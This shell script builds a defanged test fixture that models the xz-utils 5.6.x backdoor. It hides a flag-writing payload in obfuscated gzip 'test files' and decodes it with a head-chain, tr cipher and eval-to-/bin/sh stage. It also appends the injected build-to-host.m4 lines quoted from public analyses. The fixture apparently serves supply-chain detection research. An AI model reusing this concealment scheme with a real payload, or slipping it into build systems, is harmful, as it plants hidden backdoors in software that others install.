#!/bin/sh
# Build a benign, defanged model of the xz-utils 5.6.x split between the git tree and the release tarball.
# usage: mkfixture.sh DIR
# Creates DIR/git (what a repository review sees), DIR/tarball (what the release tarball adds: one
# extra m4 macro plus generated files) and DIR/ref (a pristine copy of the m4 macro).
# The hidden payload only writes a flag file; nothing here compiles, links, or touches a network.
LC_ALL=C
export LC_ALL

if [ "$#" -ne 1 ]; then
  echo "usage: mkfixture.sh DIR" >&2
  exit 2
fi
dir=$1

# The tr map of the 5.6.0 second-stage cipher (Russ Cox, "The xz attack shell script"); string2 is \0-\377.
map='\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131'

mkdir -p "$dir/git/tests/files" "$dir/git/src" "$dir/work" "$dir/ref/m4" || exit 1
printf 'int main(void) { return 0; }\n' >"$dir/git/src/hello.c"
printf 'AC_INIT([demo], [1.0])\n' >"$dir/git/configure.ac"

# Stage 2 (benign): the real one patched src/liblzma/Makefile; this one only drops a flag file,
# and only on a packaging build, using the condition quoted in Freund's oss-security post.
cat >"$dir/work/stage2.sh" <<'STAGE2'
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64"; then
  echo injected >"$builddir/injected.flag"
fi
STAGE2

# The interleaved carrier: every 16 data bytes are preceded by 8 filler bytes, and the data begins
# with 10 junk bytes that stage 1 drops with tail -c +11 (the real script used a ~2.5 KB prefix).
junk=JUNKJUNKJU
{
  printf '%s' "$junk"
  gzip -n -c "$dir/work/stage2.sh" | tr "\0-\377" "$map"
} >"$dir/work/data.bin"
total=$(wc -c <"$dir/work/data.bin" | tr -d ' ')
full=$(((total - 1) / 16))
rem=$((total - 16 * full))

chain='('
n=0
while [ "$n" -lt "$full" ]; do
  chain="$chain(head -c 8 >/dev/null) && head -c 16 && "
  n=$((n + 1))
done
chain="$chain(head -c 8 >/dev/null) && head -c $rem)"

{
  n=0
  while [ "$n" -le "$full" ]; do
    printf 'AAAAAAAA'
    dd if="$dir/work/data.bin" bs=16 skip="$n" count=1 2>/dev/null
    n=$((n + 1))
  done
} | gzip -n -c >"$dir/git/tests/files/good-large_compressed.gz"

# Stage 1 (benign): decode the second carrier and run it, in the shape of the real script.
# The real script runs the head chain on a pipe, which needs a head that reads exactly what it
# needs; this model decompresses to a file and runs the chain on that seekable input instead, which
# POSIX XCU 1.4 guarantees for every head.
{
  printf 'i="%s"\n' "$chain"
  # shellcheck disable=SC2016 # the expansions belong to the generated stage-1 script
  printf 'gzip -dc "$srcdir/tests/files/good-large_compressed.gz" >"$builddir/carrier.tmp"\n'
  # shellcheck disable=SC2016 # the expansions belong to the generated stage-1 script
  printf 'eval "$i" <"$builddir/carrier.tmp" | tail -c +11 | tr "%s" "\\0-\\377" | gzip -d | /bin/sh\n' "$map"
  # shellcheck disable=SC2016 # the expansions belong to the generated stage-1 script
  printf 'rm -f "$builddir/carrier.tmp"\n'
} >"$dir/work/stage1.sh"

# The first carrier: a plain marker line, then the gzip stream with tab/space and dash/underscore swapped.
{
  printf '####Hello####\n'
  gzip -n -c "$dir/work/stage1.sh" | tr "\t \-_" " \t_\-"
} >"$dir/git/tests/files/bad-3-corrupt_model.gzip"

# The tarball is the git tree plus generated files, plus the one macro that is not in git.
mkdir -p "$dir/tarball/m4" || exit 1
cp -R "$dir/git/." "$dir/tarball/"
printf '# generated by autoconf\n' >"$dir/tarball/configure"
printf 'm4_include([m4/build-to-host.m4])\n' >"$dir/tarball/aclocal.m4"

cat >"$dir/ref/m4/build-to-host.m4" <<'CLEAN'
# build-to-host.m4 serial 3
AC_DEFUN([gl_BUILD_TO_HOST_INIT],
[
  gl_sed_double_backslashes='s/\\/\\\\/g'
  gl_sed_escape_doublequotes='s/"/\\"/g'
  gl_flags=`echo "$gl_flags" | tr '\n' ' '`
  eval "$gl_cv_host_conv"
])
CLEAN

# The injected macro: these lines are quoted from public analyses of the real m4/build-to-host.m4
# (serial 30); without the two data files and a build that runs them, they are inert text.
cp "$dir/ref/m4/build-to-host.m4" "$dir/tarball/m4/build-to-host.m4"
cat >>"$dir/tarball/m4/build-to-host.m4" <<'INJECTED'
# build-to-host.m4 serial 30
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
gl_path_map='tr "\t \-_" " \t_\-"'
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
INJECTED
